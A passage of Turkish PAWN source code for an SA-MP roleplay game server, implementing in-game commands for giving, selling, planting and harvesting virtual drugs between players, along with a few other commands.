						    UyusturucuTeklif[giveplayerid] = playerid;
						    UyusturucuTeklifMiktar[giveplayerid] = miktar;
						    return 1;
						}
						else
						{
							Hata(playerid, "Üzerinizde bu kadar morfin bulunmamakta.");
						}
					}
					else
					{
						Hata(playerid, "Geçersiz bir miktar girdiniz.");
					}
				}
	        	if(!strcmp(string, "mda", true))
		        {
			        new tur[256];
			        strmid(tur, string, 0, strlen(string));
			        string = strtok(cmdtext, idx);
			        if(!strlen(string))
			        {
				        Kullanim(playerid, "/uyusturucu ver [playerid] [tür] [miktar]");
				        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
				        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
				        return 1;
			        }
					new miktar = strval(string);
					if(miktar > 0)
					{
						if(Karakter[playerid][MDA]-miktar >= 0)
						{
							format(string, sizeof(string), "{CCE6E6}%s size uyuþturucu vermek istiyor.\nUyuþturucu Türü: {FFFFFF}MDA\n{CCE6E6}Uyuþturucu Gramý: {FFFFFF}%d\nUyuþturucuyu almak istiyor musunuz?", OyuncuAdiniBul(playerid), miktar);
						    ShowPlayerDialog(giveplayerid, 191, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Uyuþturucu Teklifi", string, "Kabul Et", "Reddet");
						    UyusturucuTeklif[giveplayerid] = playerid;
						    UyusturucuTeklifMiktar[giveplayerid] = miktar;
							return 1;
						}
						else
						{
							Hata(playerid, "Üzerinizde bu kadar MDA bulunmamakta.");
						}
					}
					else
					{
						Hata(playerid, "Geçersiz bir miktar girdiniz.");
					}
				}
		        else
		        {
					Hata(playerid, "Eksik ya da geçersiz bir tür girdiniz.");
			        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
			        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
			        return 1;
		        }
		    }
		    else Hata(playerid, "Uyuþturucu vermek istediðiniz oyuncu yakýnýnýzda deðil.");
		}
		else if(!strcmp(string, "sat", true))
		{
		    string = strtok(cmdtext, idx);
		    if(!strlen(string))
		    {
		        Kullanim(playerid, "/uyusturucu sat [playerid] [tür] [miktar] [fiyat]");
		        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
		        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
		        return 1;
		    }
			new giveplayerid = strval(string);
		    if(ProxDetectorS(3.5, playerid, giveplayerid) && playerid != giveplayerid)
		    {
		        string = strtok(cmdtext, idx);
		        if(!strlen(string))
		        {
			        Kullanim(playerid, "/uyusturucu sat [playerid] [tür] [miktar] [fiyat]");
			        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
			        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
			        return 1;
		        }
		        if(!strcmp(string, "esrar", true))
		        {
			        new tur[256];
			        strmid(tur, string, 0, strlen(string));
			        string = strtok(cmdtext, idx);
			        if(!strlen(string))
			        {
				        Kullanim(playerid, "/uyusturucu sat [playerid] [tür] [miktar] [fiyat]");
				        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
				        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
				        return 1;
			        }
					new miktar = strval(string);
					if(miktar > 0)
					{
						if(Karakter[playerid][uesrar]-miktar >= 0)
						{
						    string = strtok(cmdtext, idx);
						    if(!strlen(string))
						    {
						        Kullanim(playerid, "/uyusturucu sat [playerid] [tür] [miktar] [fiyat]");
						        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
						        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
						        return 1;
						    }
						    new fiyat = strval(string);
						    if(fiyat > 0)
						    {
								format(string, sizeof(string), "{CCE6E6}%s size uyuþturucu satmak istiyor.\nUyuþturucu Türü: {FFFFFF}Esrar\n{CCE6E6}Uyuþturucu Gramý: {FFFFFF}%d\n{CCE6E6}Satýþ Fiyatý: %d$\nUyuþturucuyu almak istiyor musunuz?", OyuncuAdiniBul(playerid), miktar, fiyat);
							    ShowPlayerDialog(giveplayerid, 102, DIALOG_STYLE_MSGBOX, "Uyuþturucu Teklifi", string, "Kabul Et", "Reddet");
							    UyusturucuTeklif[giveplayerid] = playerid;
							    UyusturucuTeklifMiktar[giveplayerid] = miktar;
							    UyusturucuTeklifFiyat[giveplayerid] = fiyat;
							    return 1;
							}
							else Hata(playerid, "Geçersiz bir miktar girdiniz.");
						}
						else Hata(playerid, "Üzerinizde bu kadar esrar bulunmamakta.");
					}
					else Hata(playerid, "Geçersiz bir miktar girdiniz.");
		        }
		        if(!strcmp(string, "amfetamin", true))
		        {
			        new tur[256];
			        strmid(tur, string, 0, strlen(string));
			        string = strtok(cmdtext, idx);
			        if(!strlen(string))
			        {
				        Kullanim(playerid, "/uyusturucu sat [playerid] [tür] [miktar] [fiyat]");
				        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
				        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
				        return 1;
			        }
					new miktar = strval(string);
					if(miktar > 0)
					{
						if(Karakter[playerid][amfetamin]-miktar >= 0)
						{
						    string = strtok(cmdtext, idx);
						    if(!strlen(string))
						    {
						        Kullanim(playerid, "/uyusturucu sat [playerid] [tür] [miktar] [fiyat]");
						        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
						        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
						        return 1;
						    }
						    new fiyat = strval(string);
						    if(fiyat > 0)
						    {
								format(string, sizeof(string), "{CCE6E6}%s size uyuþturucu satmak istiyor.\nUyuþturucu Türü: {FFFFFF}Amfetamin\n{CCE6E6}Uyuþturucu Gramý: {FFFFFF}%d\n{CCE6E6}Satýþ Fiyatý: %d$\nUyuþturucuyu almak istiyor musunuz?", OyuncuAdiniBul(playerid), miktar, fiyat);
							    ShowPlayerDialog(giveplayerid, 193, DIALOG_STYLE_MSGBOX, "Uyuþturucu Teklifi", string, "Kabul Et", "Reddet");
							    UyusturucuTeklif[giveplayerid] = playerid;
							    UyusturucuTeklifMiktar[giveplayerid] = miktar;
							    UyusturucuTeklifFiyat[giveplayerid] = fiyat;
							    return 1;
							}
							else Hata(playerid, "Geçersiz bir miktar girdiniz.");
						}
						else Hata(playerid, "Üzerinizde bu kadar amfetamin bulunmamakta.");
					}
					else Hata(playerid, "Geçersiz bir miktar girdiniz.");
		        }
		        if(!strcmp(string, "metamfetamin", true))
		        {
			        new tur[256];
			        strmid(tur, string, 0, strlen(string));
			        string = strtok(cmdtext, idx);
			        if(!strlen(string))
			        {
				        Kullanim(playerid, "/uyusturucu sat [playerid] [tür] [miktar] [fiyat]");
				        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
				        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
				        return 1;
			        }
					new miktar = strval(string);
					if(miktar > 0)
					{
						if(Karakter[playerid][metamfetamin]-miktar >= 0)
						{
						    string = strtok(cmdtext, idx);
						    if(!strlen(string))
						    {
						        Kullanim(playerid, "/uyusturucu sat [playerid] [tür] [miktar] [fiyat]");
						        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
						        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
						        return 1;
						    }
						    new fiyat = strval(string);
						    if(fiyat > 0)
						    {
								format(string, sizeof(string), "{CCE6E6}%s size uyuþturucu satmak istiyor.\nUyuþturucu Türü: {FFFFFF}Metamfetamin\n{CCE6E6}Uyuþturucu Gramý: {FFFFFF}%d\n{CCE6E6}Satýþ Fiyatý: %d$\nUyuþturucuyu almak istiyor musunuz?", OyuncuAdiniBul(playerid), miktar, fiyat);
							    ShowPlayerDialog(giveplayerid, 194, DIALOG_STYLE_MSGBOX, "Uyuþturucu Teklifi", string, "Kabul Et", "Reddet");
							    UyusturucuTeklif[giveplayerid] = playerid;
							    UyusturucuTeklifMiktar[giveplayerid] = miktar;
							    UyusturucuTeklifFiyat[giveplayerid] = fiyat;
							    return 1;
							}
							else Hata(playerid, "Geçersiz bir miktar girdiniz.");
						}
						else Hata(playerid, "Üzerinizde bu kadar metamfetamin bulunmamakta.");
					}
					else Hata(playerid, "Geçersiz bir miktar girdiniz.");
		        }
		        if(!strcmp(string, "lsd", true))
		        {
			        new tur[256];
			        strmid(tur, string, 0, strlen(string));
			        string = strtok(cmdtext, idx);
			        if(!strlen(string))
			        {
				        Kullanim(playerid, "/uyusturucu sat [playerid] [tür] [miktar] [fiyat]");
				        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
				        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
				        return 1;
			        }
					new miktar = strval(string);
					if(miktar > 0)
					{
						if(Karakter[playerid][lsd]-miktar >= 0)
						{
						    string = strtok(cmdtext, idx);
						    if(!strlen(string))
						    {
						        Kullanim(playerid, "/uyusturucu sat [playerid] [tür] [miktar] [fiyat]");
						        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
						        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
						        return 1;
						    }
						    new fiyat = strval(string);
						    if(fiyat > 0)
						    {
								format(string, sizeof(string), "{CCE6E6}%s size uyuþturucu satmak istiyor.\nUyuþturucu Türü: {FFFFFF}LSD\n{CCE6E6}Uyuþturucu Gramý: {FFFFFF}%d\n{CCE6E6}Satýþ Fiyatý: %d$\nUyuþturucuyu almak istiyor musunuz?", OyuncuAdiniBul(playerid), miktar, fiyat);
							    ShowPlayerDialog(giveplayerid, 195, DIALOG_STYLE_MSGBOX, "Uyuþturucu Teklifi", string, "Kabul Et", "Reddet");
							    UyusturucuTeklif[giveplayerid] = playerid;
							    UyusturucuTeklifMiktar[giveplayerid] = miktar;
							    UyusturucuTeklifFiyat[giveplayerid] = fiyat;
							    return 1;
							}
							else Hata(playerid, "Geçersiz bir miktar girdiniz.");
						}
						else Hata(playerid, "Üzerinizde bu kadar lsd bulunmamakta.");
					}
					else Hata(playerid, "Geçersiz bir miktar girdiniz.");
		        }
		        if(!strcmp(string, "extacy", true))
		        {
			        new tur[256];
			        strmid(tur, string, 0, strlen(string));
			        string = strtok(cmdtext, idx);
			        if(!strlen(string))
			        {
				        Kullanim(playerid, "/uyusturucu sat [playerid] [tür] [miktar] [fiyat]");
				        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
				        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
				        return 1;
			        }
					new miktar = strval(string);
					if(miktar > 0)
					{
						if(Karakter[playerid][extacy]-miktar >= 0)
						{
						    string = strtok(cmdtext, idx);
						    if(!strlen(string))
						    {
						        Kullanim(playerid, "/uyusturucu sat [playerid] [tür] [miktar] [fiyat]");
						        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
						        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
						        return 1;
						    }
						    new fiyat = strval(string);
						    if(fiyat > 0)
						    {
								format(string, sizeof(string), "{CCE6E6}%s size uyuþturucu satmak istiyor.\nUyuþturucu Türü: {FFFFFF}Extacy\n{CCE6E6}Uyuþturucu Gramý: {FFFFFF}%d\n{CCE6E6}Satýþ Fiyatý: %d$\nUyuþturucuyu almak istiyor musunuz?", OyuncuAdiniBul(playerid), miktar, fiyat);
							    ShowPlayerDialog(giveplayerid, 196, DIALOG_STYLE_MSGBOX, "Uyuþturucu Teklifi", string, "Kabul Et", "Reddet");
							    UyusturucuTeklif[giveplayerid] = playerid;
							    UyusturucuTeklifMiktar[giveplayerid] = miktar;
							    UyusturucuTeklifFiyat[giveplayerid] = fiyat;
							    return 1;
							}
							else Hata(playerid, "Geçersiz bir miktar girdiniz.");
						}
						else Hata(playerid, "Üzerinizde bu kadar extacy bulunmamakta.");
					}
					else Hata(playerid, "Geçersiz bir miktar girdiniz.");
		        }
		        if(!strcmp(string, "kokain", true))
		        {
			        new tur[256];
			        strmid(tur, string, 0, strlen(string));
			        string = strtok(cmdtext, idx);
			        if(!strlen(string))
			        {
				        Kullanim(playerid, "/uyusturucu sat [playerid] [tür] [miktar] [fiyat]");
				        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
				        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
				        return 1;
			        }
					new miktar = strval(string);
					if(miktar > 0)
					{
						if(Karakter[playerid][kokain]-miktar >= 0)
						{
						    string = strtok(cmdtext, idx);
						    if(!strlen(string))
						    {
						        Kullanim(playerid, "/uyusturucu sat [playerid] [tür] [miktar] [fiyat]");
						        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
						        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
						        return 1;
						    }
						    new fiyat = strval(string);
						    if(fiyat > 0)
						    {
								format(string, sizeof(string), "{CCE6E6}%s size uyuþturucu satmak istiyor.\nUyuþturucu Türü: {FFFFFF}Kokain\n{CCE6E6}Uyuþturucu Gramý: {FFFFFF}%d\n{CCE6E6}Satýþ Fiyatý: %d$\nUyuþturucuyu almak istiyor musunuz?", OyuncuAdiniBul(playerid), miktar, fiyat);
							    ShowPlayerDialog(giveplayerid, 197, DIALOG_STYLE_MSGBOX, "Uyuþturucu Teklifi", string, "Kabul Et", "Reddet");
							    UyusturucuTeklif[giveplayerid] = playerid;
							    UyusturucuTeklifMiktar[giveplayerid] = miktar;
							    UyusturucuTeklifFiyat[giveplayerid] = fiyat;
							    return 1;
							}
							else Hata(playerid, "Geçersiz bir miktar girdiniz.");
						}
						else Hata(playerid, "Üzerinizde bu kadar kokain bulunmamakta.");
					}
					else Hata(playerid, "Geçersiz bir miktar girdiniz.");
		        }
		        if(!strcmp(string, "eroin", true))
		        {
			        new tur[256];
			        strmid(tur, string, 0, strlen(string));
			        string = strtok(cmdtext, idx);
			        if(!strlen(string))
			        {
				        Kullanim(playerid, "/uyusturucu sat [playerid] [tür] [miktar] [fiyat]");
				        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
				        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
				        return 1;
			        }
					new miktar = strval(string);
					if(miktar > 0)
					{
						if(Karakter[playerid][eroin]-miktar >= 0)
						{
						    string = strtok(cmdtext, idx);
						    if(!strlen(string))
						    {
						        Kullanim(playerid, "/uyusturucu sat [playerid] [tür] [miktar] [fiyat]");
						        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
						        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
						        return 1;
						    }
						    new fiyat = strval(string);
						    if(fiyat > 0)
						    {
								format(string, sizeof(string), "{CCE6E6}%s size uyuþturucu satmak istiyor.\nUyuþturucu Türü: {FFFFFF}Kokain\n{CCE6E6}Uyuþturucu Gramý: {FFFFFF}%d\n{CCE6E6}Satýþ Fiyatý: %d$\nUyuþturucuyu almak istiyor musunuz?", OyuncuAdiniBul(playerid), miktar, fiyat);
							    ShowPlayerDialog(giveplayerid, 198, DIALOG_STYLE_MSGBOX, "Uyuþturucu Teklifi", string, "Kabul Et", "Reddet");
							    UyusturucuTeklif[giveplayerid] = playerid;
							    UyusturucuTeklifMiktar[giveplayerid] = miktar;
							    UyusturucuTeklifFiyat[giveplayerid] = fiyat;
							    return 1;
							}
							else Hata(playerid, "Geçersiz bir miktar girdiniz.");
						}
						else Hata(playerid, "Üzerinizde bu kadar eroin bulunmamakta.");
					}
					else Hata(playerid, "Geçersiz bir miktar girdiniz.");
		        }
		        if(!strcmp(string, "morfin", true))
		        {
			        new tur[256];
			        strmid(tur, string, 0, strlen(string));
			        string = strtok(cmdtext, idx);
			        if(!strlen(string))
			        {
				        Kullanim(playerid, "/uyusturucu sat [playerid] [tür] [miktar] [fiyat]");
				        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
				        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
				        return 1;
			        }
					new miktar = strval(string);
					if(miktar > 0)
					{
						if(Karakter[playerid][morfin]-miktar >= 0)
						{
						    string = strtok(cmdtext, idx);
						    if(!strlen(string))
						    {
						        Kullanim(playerid, "/uyusturucu sat [playerid] [tür] [miktar] [fiyat]");
						        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
						        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
						        return 1;
						    }
						    new fiyat = strval(string);
						    if(fiyat > 0)
						    {
								format(string, sizeof(string), "{CCE6E6}%s size uyuþturucu satmak istiyor.\nUyuþturucu Türü: {FFFFFF}Morfin\n{CCE6E6}Uyuþturucu Gramý: {FFFFFF}%d\n{CCE6E6}Satýþ Fiyatý: %d$\nUyuþturucuyu almak istiyor musunuz?", OyuncuAdiniBul(playerid), miktar, fiyat);
							    ShowPlayerDialog(giveplayerid, 199, DIALOG_STYLE_MSGBOX, "Uyuþturucu Teklifi", string, "Kabul Et", "Reddet");
							    UyusturucuTeklif[giveplayerid] = playerid;
							    UyusturucuTeklifMiktar[giveplayerid] = miktar;
							    UyusturucuTeklifFiyat[giveplayerid] = fiyat;
							    return 1;
							}
							else Hata(playerid, "Geçersiz bir miktar girdiniz.");
						}
						else Hata(playerid, "Üzerinizde bu kadar morfin bulunmamakta.");
					}
					else Hata(playerid, "Geçersiz bir miktar girdiniz.");
		        }
		        if(!strcmp(string, "mda", true))
		        {
			        new tur[256];
			        strmid(tur, string, 0, strlen(string));
			        string = strtok(cmdtext, idx);
			        if(!strlen(string))
			        {
				        Kullanim(playerid, "/uyusturucu sat [playerid] [tür] [miktar] [fiyat]");
				        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
				        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
				        return 1;
			        }
					new miktar = strval(string);
					if(miktar > 0)
					{
						if(Karakter[playerid][MDA]-miktar >= 0)
						{
						    string = strtok(cmdtext, idx);
						    if(!strlen(string))
						    {
						        Kullanim(playerid, "/uyusturucu sat [playerid] [tür] [miktar] [fiyat]");
						        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
						        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
						        return 1;
						    }
						    new fiyat = strval(string);
						    if(fiyat > 0)
						    {
								format(string, sizeof(string), "{CCE6E6}%s size uyuþturucu satmak istiyor.\nUyuþturucu Türü: {FFFFFF}MDA\n{CCE6E6}Uyuþturucu Gramý: {FFFFFF}%d\n{CCE6E6}Satýþ Fiyatý: %d$\nUyuþturucuyu almak istiyor musunuz?", OyuncuAdiniBul(playerid), miktar, fiyat);
							    ShowPlayerDialog(giveplayerid, 200, DIALOG_STYLE_MSGBOX, "Uyuþturucu Teklifi", string, "Kabul Et", "Reddet");
							    UyusturucuTeklif[giveplayerid] = playerid;
							    UyusturucuTeklifMiktar[giveplayerid] = miktar;
							    UyusturucuTeklifFiyat[giveplayerid] = fiyat;
							    return 1;
							}
							else Hata(playerid, "Geçersiz bir miktar girdiniz.");
						}
						else Hata(playerid, "Üzerinizde bu kadar MDA bulunmamakta.");
					}
					else Hata(playerid, "Geçersiz bir miktar girdiniz.");
		        }
		        else
		        {
					Hata(playerid, "Eksik ya da geçersiz bir tür girdiniz.");
			        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
			        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
			        return 1;
		        }
		    }
		    else Hata(playerid, "Uyuþturucu vermek istediðiniz oyuncu yakýnýnýzda deðil.");
		}
		else if(!strcmp(string, "bilgi", true))
		{
			SendClientMessageEx(playerid,-1, ""C2"[UYUÞTURUCULAR] "C1"Esrar: ["C2"%d"C1"] Amfetamin: ["C2"%d"C1"] Metamfetamin: ["C2"%d"C1"]", Karakter[playerid][uesrar], Karakter[playerid][amfetamin], Karakter[playerid][metamfetamin]);
			SendClientMessageEx(playerid,-1, ""C2"[UYUÞTURUCULAR] "C1"LSD: ["C2"%d"C1"] Extacy: ["C2"%d"C1"] Kokain: ["C2"%d"C1"]", Karakter[playerid][lsd], Karakter[playerid][extacy], Karakter[playerid][kokain]);
			SendClientMessageEx(playerid,-1, ""C2"[UYUÞTURUCULAR] "C1"Eroin: ["C2"%d"C1"] Morfin: ["C2"%d"C1"] MDA: ["C2"%d"C1"]",Karakter[playerid][eroin], Karakter[playerid][morfin], Karakter[playerid][MDA]);
		}
		else if(!strcmp(string, "saksi", true))
		{
		    if(GetPlayerVirtualWorld(playerid) == 0 && GetPlayerInterior(playerid) == 0) return Hata(playerid, "Buraya saksý býrakamazsýnýz.");
		    if(!Karakter[playerid][usaksi]) return Hata(playerid, "Hiç saksýnýz bulunmamakta.");
			ElineVer(playerid, 2203);
			Karakter[playerid][usaksi]--;
		}
		else if(!strcmp(string, "saksibirak", true))
		{
			if(!Tasiyor[playerid]) return Hata(playerid, "Herhangi bir þey taþýmýyorsunuz.");
   			if(GetPlayerVirtualWorld(playerid) == 0 && GetPlayerInterior(playerid) == 0 || GetPlayerVirtualWorld(playerid) == 461) return Hata(playerid, "Buraya býrakamazsýnýz.");
			YereBirak(playerid, Tasiyor[playerid], 1);
			ElindenAl(playerid);
			return 1;
		}
		else if(!strcmp(string, "kaldir", true))
		{
			Bilgi(playerid, "Kaldýrmak istediðiniz saksýyý seçin. Ýþlemi iptal etmek için ESC tuþunu kullanýn.");
		    SelectObject(playerid);
		    SelectObjectTur[playerid] = 6;
			return 1;
		}
		else if(!strcmp(string, "tohumek", true))
		{
		    new mstring[256];
		    format(mstring, sizeof(mstring), "Esrar\t ( "C2"%d "C1")",Karakter[playerid][esrartohum]);
			ShowPlayerDialog(playerid, 278, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Tohum Ek", mstring, "Ek", "Ýptal");
		}
		else if(!strcmp(string, "tohumver", true))
		{
		    string = strtok(cmdtext, idx);
		    if(!strlen(string))
		    {
		        Kullanim(playerid, "/uyusturucu tohumver [playerid] [tür] [miktar]");
		        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, kokain, eroin");
		        return 1;
		    }
			new giveplayerid = strval(string);
		    if(ProxDetectorS(3.5, playerid, giveplayerid) && playerid != giveplayerid)
		    {
		        string = strtok(cmdtext, idx);
		        if(!strlen(string))
		        {
			        Kullanim(playerid, "/uyusturucu tohumver [playerid] [tür] [miktar]");
			        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, kokain, eroin");
			        return 1;
		        }
		        if(!strcmp(string, "esrar", true))
		        {
			        new tur[256];
			        strmid(tur, string, 0, strlen(string));
			        string = strtok(cmdtext, idx);
			        if(!strlen(string))
			        {
				        Kullanim(playerid, "/uyusturucu tohumver [playerid] [tür] [miktar]");
				        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, kokain, eroin");
				        return 1;
			        }
					new miktar = strval(string);
					if(miktar > 0)
					{
					    if(Karakter[playerid][esrartohum] < miktar) return Hata(playerid, "Üzerinizde bu kadar esrar tohumu yok.");
					    new mstring[128];
					    format(mstring, sizeof(mstring), "%s oyuncu size %d adet esrar tohumu verdi.",OyuncuAdiniBul(playerid),miktar);
					    Bilgi(giveplayerid, mstring);
					    format(mstring, sizeof(mstring), "%s oyuncuya %d adet esrar tohumu verdiniz.",OyuncuAdiniBul(giveplayerid),miktar);
					    Bilgi(playerid, mstring);
						Karakter[playerid][esrartohum] -= miktar;
						Karakter[giveplayerid][esrartohum] += miktar;
					}
					else return Kullanim(playerid, "/uyusturucu tohumver [playerid] [tür] [miktar]"), SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, kokain, eroin");
				}
				else if(!strcmp(string, "kokain", true))
		        {
			        new tur[256];
			        strmid(tur, string, 0, strlen(string));
			        string = strtok(cmdtext, idx);
			        if(!strlen(string))
			        {
				        Kullanim(playerid, "/uyusturucu tohumver [playerid] [tür] [miktar]");
				        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, kokain, eroin");
				        return 1;
			        }
					new miktar = strval(string);
					if(miktar > 0)
					{
					    if(Karakter[playerid][kokaintohum] < miktar) return Hata(playerid, "Üzerinizde bu kadar kokain tohumu yok.");
					    new mstring[128];
					    format(mstring, sizeof(mstring), "%s oyuncu size %d adet kokain tohumu verdi.",OyuncuAdiniBul(playerid),miktar);
					    Bilgi(giveplayerid, mstring);
					    format(mstring, sizeof(mstring), "%s oyuncuya %d adet kokain tohumu verdiniz.",OyuncuAdiniBul(giveplayerid),miktar);
					    Bilgi(playerid, mstring);
						Karakter[playerid][kokaintohum] -= miktar;
						Karakter[giveplayerid][kokaintohum] += miktar;
					}
					else return Kullanim(playerid, "/uyusturucu tohumver [playerid] [tür] [miktar]"), SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, kokain, eroin");
				}
				else if(!strcmp(string, "eroin", true))
		        {
			        new tur[256];
			        strmid(tur, string, 0, strlen(string));
			        string = strtok(cmdtext, idx);
			        if(!strlen(string))
			        {
				        Kullanim(playerid, "/uyusturucu tohumver [playerid] [tür] [miktar]");
				        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, kokain, eroin");
				        return 1;
			        }
					new miktar = strval(string);
					if(miktar > 0)
					{
					    if(Karakter[playerid][erointohum] < miktar) return Hata(playerid, "Üzerinizde bu kadar eroin tohumu yok.");
					    new mstring[128];
					    format(mstring, sizeof(mstring), "%s oyuncu size %d adet eroin tohumu verdi.",OyuncuAdiniBul(playerid),miktar);
					    Bilgi(giveplayerid, mstring);
					    format(mstring, sizeof(mstring), "%s oyuncuya %d adet eroin tohumu verdiniz.",OyuncuAdiniBul(giveplayerid),miktar);
					    Bilgi(playerid, mstring);
						Karakter[playerid][erointohum] -= miktar;
						Karakter[giveplayerid][erointohum] += miktar;
					}
					else return Kullanim(playerid, "/uyusturucu tohumver [playerid] [tür] [miktar]"), SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, kokain, eroin");
				}
				else return Kullanim(playerid, "/uyusturucu tohumver [playerid] [tür] [miktar]"), SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, kokain, eroin");
		    }
		}
		else if(!strcmp(string, "topla", true))
		{
  			Bilgi(playerid, "Toplamak istediðiniz saksýyý seçin. Ýþlemi iptal etmek için ESC tuþunu kullanýn.");
	    	SelectObject(playerid);
	    	SelectObjectTur[playerid] = 3;
		}
		else if(!strcmp(string, "bakim", true))
		{
  			Bilgi(playerid, "Bakým yapmak istediðiniz saksýyý seçin. Ýþlemi iptal etmek için ESC tuþunu kullanýn.");
	    	SelectObject(playerid);
	    	SelectObjectTur[playerid] = 4;
		}
		else Hata(playerid, "Eksik ya da yanlýþ bir fonksiyon girdiniz.");
	    return 1;
	}

	if(!strcmp(string, "/tasi", true))
	{
		string = strtok(cmdtext, idx);
		if(!strlen(string))
		{
		    ElindenAl(playerid);
		    Tasiyor[playerid] = 0;
		}
		else
		{
	    	ElineVer(playerid, strval(string));
		}
		return 1;
	}
	if(!strcmp(string, "/pdaksesuar", true))
	{
	    if(Birlik[Karakter[playerid][birlik]][ftip] == LSPD && IsPlayerInRangeOfPoint(playerid, 15.0, Veriler[isbasiX],Veriler[isbasiY], Veriler[isbasiZ]))
	    {
	        string = "";
	        for(new x;x<5;x++)
	        {
	            if(MySQLCheckAksesuar(Karakter[playerid][sqlid],x) != 0) format(string, sizeof(string), "%s%d (DOLU)\n", string, x);
	            else format(string, sizeof(string), "%s%d\n", string, x);
	        }
        	ShowPlayerDialog(playerid, 146, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Aksesuar Sistemi", string, "Seç", "Ýptal");
			pdaksesuarda[playerid] = 1;
	    }
